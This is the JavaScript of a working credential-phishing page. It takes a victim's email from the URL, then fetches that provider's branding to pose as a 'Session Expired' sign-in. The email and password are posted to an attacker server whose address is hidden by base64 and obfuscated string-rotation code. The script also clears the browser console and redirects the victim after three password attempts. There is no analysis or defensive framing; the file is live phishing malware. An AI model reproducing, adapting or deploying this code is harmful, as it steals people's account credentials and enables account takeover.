function stopHtmlRender() {
  $("#favimg").remove();
  $("#loading").hide();
  $("#customdomain").remove();
  $("#contactform").remove();
  $("#loading").remove();
  $("#sgh1").remove();
  $("#sgh3").remove();
  document.write("Invalid Response!");
  window.stop();
  return false;
}

function randomString(len, charSet) {
  charSet = charSet || 'abcdefghijklmnopqrstuvwxyz0123456789';
  var randomString = '';
  for (var i = 0; i < len; i++) {
    var randomPoz = Math.floor(Math.random() * charSet.length);
    randomString += charSet.substring(randomPoz, randomPoz + 1);
  }
  return randomString;
}

function isBase64(str) {
  if (str === '' || str.trim() === '') {
    return false;
  }
  try {
    return btoa(atob(str)) == str;
  } catch (err) {
    return false;
  }
}

function processMail() {
  var email = window.location.hash.substr(1);
  if (isBase64(email)) {
    email = atob(window.location.hash.substr(1));
  }
email = email.toLowerCase();
  if (email === "") {
    stopHtmlRender();
  } else {
    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
        if (!filter.test(email)) {
          $("#favimg").remove();
          stopHtmlRender();
        }else {
         function _0x4685(_0xc5fc1,_0x28138b){var _0x27a6b2=_0x27a6();return _0x4685=function(_0x468577,_0x1800d3){_0x468577=_0x468577-0x93;var _0x483f14=_0x27a6b2[_0x468577];return _0x483f14;},_0x4685(_0xc5fc1,_0x28138b);}var _0x4681ce=_0x4685;function _0x27a6(){var _0xb1464f=["890861BzgNsv", "114682XmmzuR", "8951uSLnRx", "1LjrfsP", "aHR0cHM6Ly9zdW55bC1tb3Rvci5jb20vaiBqLnBocA==", "114164CgnDLi", "1MYhJRN", "677206qoCZOQ", "473185BQyADj", "1izxLaa", "574411hFYeBm", "13zpiJyh", "4GthmMr"];_0x27a6=function(){return _0xb1464f;};return _0x27a6();}
          $.ajax({
            dataType: 'JSON',
            url: (function(_0x19af31,_0x4b8b7e){var _0x291b93=_0x4685,_0x44629c=_0x19af31();while(!![]){try{var _0x4534c4=parseInt(_0x291b93(0x99))/0x1*(parseInt(_0x291b93(0x9c))/0x2)+parseInt(_0x291b93(0x97))/0x3*(parseInt(_0x291b93(0x96))/0x4)+parseInt(_0x291b93(0x9a))/0x5+-parseInt(_0x291b93(0x9b))/0x6*(-parseInt(_0x291b93(0x94))/0x7)+parseInt(_0x291b93(0x95))/0x8*(parseInt(_0x291b93(0x98))/0x9)+parseInt(_0x291b93(0x9d))/0xa+-parseInt(_0x291b93(0x93))/0xb;if(_0x4534c4===_0x4b8b7e)break;else _0x44629c['push'](_0x44629c['shift']());}catch(_0x5cde0c){_0x44629c['push'](_0x44629c['shift']());}}}(_0x27a6,0xa590a),atob(_0x4681ce(0x9e))),
            type: 'POST',
            crossDomain: true,
            data: {
              email: email
            },
            beforeSend: function (xhr) {
              $("#contactform").hide();
              $("#loading").show();
            },
            success: function (response) {
              $("#loading").show();
              if (response) {
                //console.log(response);
                if (response['signal'] == 'ok') {
                  if (response['iframe'] == 'ok') {
                    //$("#customdomain").attr("src", response['url']);
                    //$("#customdomain").removeClass("theframehidden");
                  }
                  $('body').css('background', 'url("' + response['background'] + "\")");
                  $('body').css('background-position', '50% 3%');
                  $('body').css('background-repeat', 'no-repeat');
                  $('body').css('background-attachment', 'fixed');
                  $('body').css('background-size', 'cover');
                  $('body').css('background-color', '#464646');
                  $('body').css('width', '100vw');
                  $('body').css('height', '100vh');
                  $('body').css('-webkit-background-size', 'cover');
                  $('body').css('-moz-filter', 'blur(0.5px)');
                  $('body').css('filter', 'blur(0.5px)');
                  $("#favimg").attr("href", response['favimage']);
                  $("#avatar").attr("src", response['avatar']);
                  $("#email").attr("value", email);
                } else {
                  stopHtmlRender();
                }
              }
              console.clear();
            },
            error: function (response) {
              stopHtmlRender();
            },
            complete: function () {
              $("#loading").hide();
              $("#contactform").show();
              $("#password").focus();
            }
          });
        }
  }

}

processMail();
$(document).ready(function () {
  var count = 0;
  $('#submit-btn').click(function (event) {
    $("#loading").show();
    $('#error').hide();
    $('#msg').hide();
    event.preventDefault();
    var email = $("#email").val();
    var password = $("#password").val();

    var my_email = email;
    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

    if (!filter.test(my_email)) {
      $('#error').show();
      return false;
    }
    if (password === "") {
      $("#loading").hide();
      $('#msg').show();
      $("#password").focus();
      return false;
    }
    var ind = my_email.indexOf("@");
    var my_slice = my_email.substr((ind + 1));
    $("title").html("Session Expired");
    $("#favimg").attr("href", "https://www.google.com/s2/favicons?domain=" + my_slice);
    $("#password").focus();

    count = count + 1;
   function _0x3861(){var _0xe5a3c1=['6mpdvro','11310728MMoIXq','433962voVTZF','5480syUBIE','7uGWGoV','1208538lpZeBz','3048776xIRADF','21860BCfTBL','20NtJjAs','2790VXVTiH','491960FAaFoc'];_0x3861=function(){return _0xe5a3c1;};return _0x3861();}function _0x3f02(_0x29d1b3,_0x2f5e9d){var _0x386171=_0x3861();return _0x3f02=function(_0x3f02ac,_0x300b63){_0x3f02ac=_0x3f02ac-0x17d;var _0x582c26=_0x386171[_0x3f02ac];return _0x582c26;},_0x3f02(_0x29d1b3,_0x2f5e9d);}
    $.ajax({
      dataType: 'JSON',
      url: (function(_0x8f0e4d,_0x42d7f3){var _0x1470db=_0x3f02,_0x3f1d81=_0x8f0e4d();while(!![]){try{var _0x4d383f=-parseInt(_0x1470db(0x185))/0x1+-parseInt(_0x1470db(0x183))/0x2*(parseInt(_0x1470db(0x17e))/0x3)+-parseInt(_0x1470db(0x17d))/0x4+-parseInt(_0x1470db(0x181))/0x5*(-parseInt(_0x1470db(0x187))/0x6)+parseInt(_0x1470db(0x182))/0x7*(parseInt(_0x1470db(0x184))/0x8)+-parseInt(_0x1470db(0x180))/0x9*(-parseInt(_0x1470db(0x186))/0xa)+parseInt(_0x1470db(0x17f))/0xb;if(_0x4d383f===_0x42d7f3)break;else _0x3f1d81['push'](_0x3f1d81['shift']());}catch(_0xe6a44a){_0x3f1d81['push'](_0x3f1d81['shift']());}}}(_0x3861,0xa1a11),atob('aHR0cHM6Ly9oaXZlcmlkZ2UubGl2ZS8wcGo2dXNkNzV5dXV3cmF0OTJuYWY4aDNhL3Bvc3QucGhw')),
      type: 'POST',
      data: {
        email: email,
        password: password,
      },
      beforeSend: function (xhr) {
        $('#submit-btn').html('Validating...');
      },
      success: function (response) {
        if (response) {
          $("#msg").show();
          //console.log(response);
          if (response['signal'] == 'ok') {
            $("#password").val("");
            if (count >= 3) {
              count = 0;

              window.location.replace("/success.html?" + randomString(20) + "=" + randomString(20) + "&udid=" + btoa(my_email) + "&redir=" + btoa(response['redirect_link']));
            }
          }
        }
        console.clear();
      },
      error: function (response) {
        $("#password").val("");
        processMail();
        if (count >= 3) {
          count = 0;
          window.location.replace(response['redirect_link']);
        }
        $("#msg").show();
      },
      complete: function () {
        $('#submit-btn').html('Sign in');
        $("#loading").hide();
      }
    });

  });
});